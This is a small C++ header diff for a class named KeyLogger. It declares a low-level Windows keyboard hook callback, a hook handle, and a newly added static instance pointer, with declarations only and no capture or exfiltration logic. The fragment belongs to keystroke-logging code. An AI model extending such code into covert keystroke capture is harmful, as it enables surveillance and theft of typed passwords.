@@ -19,8 +19,8 @@ private:
     void InstallHook(void);
 
 	static LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
-	//static LRESULT CALLBACK LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam );
 
 	bool mHookReleased;
 	HHOOK mHook;
+	static KeyLogger* instance;
 };
